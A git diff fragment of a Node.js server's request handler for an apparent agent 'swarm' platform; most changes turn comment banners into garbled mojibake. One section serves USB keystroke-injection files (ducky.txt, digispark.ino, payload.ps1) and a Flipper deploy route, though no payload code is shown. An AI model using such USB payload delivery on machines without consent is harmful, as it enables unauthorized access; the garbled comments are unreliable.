       return json(res, 200, sm5.scaleWorkers(scaleId, body.workers || body.count));
     }
 
-    // â•â•â• GET /api/swarm/capacity â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/swarm/capacity Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/swarm/capacity') {
       var sm6 = refs.swarmManager;
       if (!sm6) return json(res, 500, { error: 'Swarm manager not available' });
       return json(res, 200, sm6.getCapacity());
     }
 
-    // â•â•â• GET /api/swarm/relay-script â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/swarm/relay-script Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/swarm/relay-script') {
       var sm7 = refs.swarmManager;
       if (!sm7) return json(res, 500, { error: 'Swarm manager not available' });
@@ -2968,11 +3028,11 @@ async function handleRequest(req, res) {
       return;
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-    // v4.5 â€" Skill Bridge + Conversation Engine
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
+    // v4.5 Ã¢â‚¬" Skill Bridge + Conversation Engine
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/skills/hub/search â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/skills/hub/search Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/skills/hub/search') {
       var sb = refs.skillBridge;
       if (!sb) return json(res, 500, { error: 'Skill bridge not available' });
@@ -2981,7 +3041,7 @@ async function handleRequest(req, res) {
       catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/skills/hub/popular â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/skills/hub/popular Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/skills/hub/popular') {
       var sb2 = refs.skillBridge;
       if (!sb2) return json(res, 500, { error: 'Skill bridge not available' });
@@ -2989,7 +3049,7 @@ async function handleRequest(req, res) {
       catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/skills/hub/install â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/skills/hub/install Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/skills/hub/install') {
       var body = JSON.parse(await readBody(req));
       var sb3 = refs.skillBridge;
@@ -2999,14 +3059,14 @@ async function handleRequest(req, res) {
       catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/skills/openclaw â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/skills/openclaw Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/skills/openclaw') {
       var sb4 = refs.skillBridge;
       if (!sb4) return json(res, 500, { error: 'Skill bridge not available' });
       return json(res, 200, { skills: sb4.discoverLocalSkills() });
     }
 
-    // â•â•â• POST /api/skills/openclaw/import â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/skills/openclaw/import Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/skills/openclaw/import') {
       var body = JSON.parse(await readBody(req));
       var sb5 = refs.skillBridge;
@@ -3015,14 +3075,14 @@ async function handleRequest(req, res) {
       return json(res, 200, sb5.importLocalSkill(body.name));
     }
 
-    // â•â•â• GET /api/skills/registry â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/skills/registry Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/skills/registry') {
       var sb6 = refs.skillBridge;
       if (!sb6) return json(res, 500, { error: 'Skill bridge not available' });
       return json(res, 200, { registry: sb6.getRegistry(), installed: sb6.listInstalledSkills() });
     }
 
-    // â•â•â• POST /api/skills/match â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/skills/match Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/skills/match') {
       var body = JSON.parse(await readBody(req));
       var sb7 = refs.skillBridge;
@@ -3031,7 +3091,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { matches: sb7.matchSkillForTask(body.task) });
     }
 
-    // â•â•â• GET /api/sessions â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/sessions Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/sessions') {
       var ce = refs.conversationEngine;
       if (!ce) return json(res, 500, { error: 'Conversation engine not available' });
@@ -3041,7 +3101,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { sessions: ce.listSessions(filter), activeSessionId: ce.getActiveSessionId() });
     }
 
-    // â•â•â• POST /api/sessions â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/sessions Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/sessions') {
       var body = JSON.parse(await readBody(req));
       var ce2 = refs.conversationEngine;
@@ -3049,7 +3109,7 @@ async function handleRequest(req, res) {
       return json(res, 200, ce2.createSession(body));
     }
 
-    // â•â•â• GET /api/sessions/search â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/sessions/search Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/sessions/search') {
       var ce3 = refs.conversationEngine;
       if (!ce3) return json(res, 500, { error: 'Conversation engine not available' });
@@ -3057,14 +3117,14 @@ async function handleRequest(req, res) {
       return json(res, 200, { results: ce3.searchConversations(q) });
     }
 
-    // â•â•â• GET /api/sessions/channels â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/sessions/channels Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/sessions/channels') {
       var ce4 = refs.conversationEngine;
       if (!ce4) return json(res, 500, { error: 'Conversation engine not available' });
       return json(res, 200, { mappings: ce4.getChannelMappings() });
     }
 
-    // â•â•â• Session-specific routes â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â Session-specific routes Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (reqPath.startsWith('/api/sessions/') && reqPath !== '/api/sessions/search' && reqPath !== '/api/sessions/channels') {
       var ceParts = reqPath.split('/');
       var ceId = ceParts[3];
@@ -3159,21 +3219,21 @@ async function handleRequest(req, res) {
       }
     }
 
-    // â•â•â• GET /api/messaging/status â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/messaging/status Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/messaging/status') {
       var hub = refs.messagingHub;
       if (!hub) return json(res, 200, { enabled: false, channels: [] });
       return json(res, 200, hub.getStatus ? hub.getStatus() : { enabled: true, channels: ['api'] });
     }
 
-    // â•â•â• GET /api/nodes â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/nodes Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/nodes') {
       var np = refs.nodePairing;
       if (!np) return json(res, 200, { devices: [], count: 0 });
       return json(res, 200, { devices: np.listDevices(), count: np.listDevices().length });
     }
 
-    // â•â•â• GET /api/rag/status â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/rag/status Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/rag/status') {
       var rag = refs.ragEngine;
       if (!rag) return json(res, 200, { enabled: false, documents: 0 });
@@ -3181,42 +3241,42 @@ async function handleRequest(req, res) {
       return json(res, 200, { enabled: true, documents: docs.length, docList: docs });
     }
 
-    // â•â•â• GET /api/sandbox/status â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/sandbox/status Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/sandbox/status') {
       var sb = refs.codeSandbox;
       if (!sb) return json(res, 200, { enabled: false });
       return json(res, 200, { enabled: true, languages: sb.getSupportedLanguages ? sb.getSupportedLanguages() : ['javascript'] });
     }
 
-    // â•â•â• GET /api/browser/status â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/browser/status Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/browser/status') {
       var bc = refs.browserControl;
       if (!bc) return json(res, 200, { enabled: false });
       return json(res, 200, { enabled: true, status: 'ready' });
     }
 
-    // â•â•â• GET /api/evolve/status â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/evolve/status Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/evolve/status') {
       var ev = refs.selfEvolve;
       if (!ev) return json(res, 200, { enabled: false });
       return json(res, 200, { enabled: true, history: ev.getHistory ? ev.getHistory() : {} });
     }
 
-    // â•â•â• GET /api/updater/status â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/updater/status Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/updater/status') {
       var upd = refs.autoUpdater;
       if (!upd) return json(res, 200, { enabled: false });
       return json(res, 200, { enabled: true, history: upd.getUpdateHistory ? upd.getUpdateHistory() : [] });
     }
 
-    // â•â•â• GET /api/sentinel/status â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/sentinel/status Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/sentinel/status') {
       var sent = refs.webSentinel;
       if (!sent) return json(res, 200, { enabled: false, watches: [] });
       return json(res, 200, { enabled: true, watches: sent.listWatches ? sent.listWatches() : [] });
     }
 
-    // â•â•â• GET /api/conversations â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/conversations Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/conversations') {
       var ce = refs.conversationEngine;
       if (!ce) return json(res, 200, { sessions: [], count: 0 });
@@ -3224,7 +3284,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { sessions: sessions, count: sessions.length });
     }
 
-    // â•â•â• Extension Bridge Routes (v2.0 â€" full browser control) â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â Extension Bridge Routes (v2.0 Ã¢â‚¬" full browser control) Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (reqPath.startsWith('/api/extension/')) {
       var extBridge = refs.extensionBridge;
       if (!extBridge) return json(res, 503, { error: 'Extension bridge not loaded' });
@@ -3241,7 +3301,7 @@ async function handleRequest(req, res) {
         if (extAction === 'watches') { try { return json(res, 200, await extBridge.sendCommand('listWatches')); } catch (e) { return json(res, 500, { error: e.message }); } }
       }
 
-      // POST routes â€" parse body once
+      // POST routes Ã¢â‚¬" parse body once
       if (method === 'POST') {
         try {
           var body = JSON.parse(await readBody(req));
@@ -3325,7 +3385,7 @@ async function handleRequest(req, res) {
       return json(res, 404, { error: 'Unknown extension action', action: extAction });
     }
 
-    // â"€â"€â"€ Key Vault Routes â"€â"€â"€
+    // Ã¢"â‚¬Ã¢"â‚¬Ã¢"â‚¬ Key Vault Routes Ã¢"â‚¬Ã¢"â‚¬Ã¢"â‚¬
     if (reqPath === '/api/keys' && method === 'GET') {
       if (!authenticate(req)) return json(res, 401, { error: 'Unauthorized' });
       var kp = _refs.keyProvisioner;
@@ -3391,7 +3451,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â"€â"€â"€ Swarm Provider Manager Routes â"€â"€â"€
+    // Ã¢"â‚¬Ã¢"â‚¬Ã¢"â‚¬ Swarm Provider Manager Routes Ã¢"â‚¬Ã¢"â‚¬Ã¢"â‚¬
     if (reqPath === '/api/providers' && method === 'GET') {
       if (!authenticate(req)) return json(res, 401, { error: 'Unauthorized' });
       var pm = _refs.providerManager;
@@ -3430,7 +3490,7 @@ async function handleRequest(req, res) {
       return json(res, 200, result);
     }
 
-    // â"€â"€â"€ Swarm Agents Routes â"€â"€â"€
+    // Ã¢"â‚¬Ã¢"â‚¬Ã¢"â‚¬ Swarm Agents Routes Ã¢"â‚¬Ã¢"â‚¬Ã¢"â‚¬
     if (reqPath === '/api/agents/swarm' && method === 'GET') {
       if (!authenticate(req)) return json(res, 401, { error: 'Unauthorized' });
       var sa = _refs.swarmAgents;
@@ -3596,9 +3656,9 @@ async function handleRequest(req, res) {
       return json(res, 200, global._usbFlashProgress || { step: 0, total: 7, status: 'idle' });
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // USB SWARM DEPLOYER ENDPOINTS
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
     const usbSwarmDir = path.join(__dirname, '..', 'usb-swarm');
 
@@ -3612,7 +3672,7 @@ async function handleRequest(req, res) {
       return;
     }
 
-    // â•â•â• GET /api/usb-swarm/payload.ps1 â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/usb-swarm/payload.ps1 Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/usb-swarm/payload.ps1') {
       try {
         const data = fs.readFileSync(path.join(usbSwarmDir, 'payload.ps1'), 'utf8');
@@ -3622,7 +3682,7 @@ async function handleRequest(req, res) {
       return;
     }
 
-    // â•â•â• GET /api/usb-swarm/worker.js â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/usb-swarm/worker.js Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/usb-swarm/worker.js') {
       try {
         const data = fs.readFileSync(path.join(usbSwarmDir, 'worker.js'), 'utf8');
@@ -3632,7 +3692,7 @@ async function handleRequest(req, res) {
       return;
     }
 
-    // â•â•â• GET /api/usb-swarm/worker-linux.js â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/usb-swarm/worker-linux.js Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/usb-swarm/worker-linux.js') {
       try {
         const data = fs.readFileSync(path.join(usbSwarmDir, 'worker-linux.js'), 'utf8');
@@ -3642,7 +3702,7 @@ async function handleRequest(req, res) {
       return;
     }
 
-    // â•â•â• GET /api/usb-swarm/deploy-gcp.sh â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/usb-swarm/deploy-gcp.sh Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/usb-swarm/deploy-gcp.sh') {
       try {
         const data = fs.readFileSync(path.join(usbSwarmDir, 'deploy-gcp.sh'), 'utf8');
@@ -3652,7 +3712,7 @@ async function handleRequest(req, res) {
       return;
     }
 
-    // â•â•â• GET /api/usb-swarm/digispark.ino â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/usb-swarm/digispark.ino Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/usb-swarm/digispark.ino') {
       try {
         const data = fs.readFileSync(path.join(usbSwarmDir, 'digispark.ino'), 'utf8');
@@ -3662,7 +3722,7 @@ async function handleRequest(req, res) {
       return;
     }
 
-    // â•â•â• GET /api/usb-swarm/status â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/usb-swarm/status Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/usb-swarm/status') {
       try {
         // Build local worker list from _knownWorkers
@@ -3695,7 +3755,7 @@ async function handleRequest(req, res) {
       }
     }
 
-    // â•â•â• GET /api/usb-swarm/config â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/usb-swarm/config Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/usb-swarm/config') {
       try {
         const data = JSON.parse(fs.readFileSync(path.join(usbSwarmDir, 'config.json'), 'utf8'));
@@ -3703,7 +3763,7 @@ async function handleRequest(req, res) {
       } catch { return json(res, 200, { config: {} }); }
     }
 
-    // â•â•â• POST /api/usb-swarm/config â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/usb-swarm/config Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/usb-swarm/config') {
       const body = JSON.parse(await readBody(req));
       try {
@@ -3715,7 +3775,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/usb-swarm/ducky.txt â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/usb-swarm/ducky.txt Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/usb-swarm/ducky.txt') {
       try {
         const data = fs.readFileSync(path.join(usbSwarmDir, 'ducky.txt'), 'utf8');
@@ -3725,14 +3785,14 @@ async function handleRequest(req, res) {
       return;
     }
 
-    // â•â•â• GET /api/usb-swarm/flipper/status â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/usb-swarm/flipper/status Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/usb-swarm/flipper/status') {
       const flipper = _refs.flipperDeployer;
       if (!flipper) return json(res, 200, { connected: false, driveLetter: null, deployed: false });
       return json(res, 200, flipper.getStatus());
     }
 
-    // â•â•â• POST /api/usb-swarm/flipper/deploy â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/usb-swarm/flipper/deploy Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/usb-swarm/flipper/deploy') {
       const flipper = _refs.flipperDeployer;
       if (!flipper) return json(res, 500, { error: 'Flipper deployer not initialized' });
@@ -3740,11 +3800,11 @@ async function handleRequest(req, res) {
       return json(res, result.success ? 200 : 400, result);
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-    // v5.0 â€" Boot Sequence, Network Scanner, Terminal, Models, Notifications
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
+    // v5.0 Ã¢â‚¬" Boot Sequence, Network Scanner, Terminal, Models, Notifications
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/boot â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/boot Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/boot') {
       var bs = refs.bootStatus || {};
       var labels = refs.bootLabels || {};
@@ -3755,7 +3815,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { version: version, modules: modules, totalModules: modules.length, online: modules.filter(function(m) { return m.status === 'ok'; }).length });
     }
 
-    // â•â•â• GET /api/network/scan â•â•â•
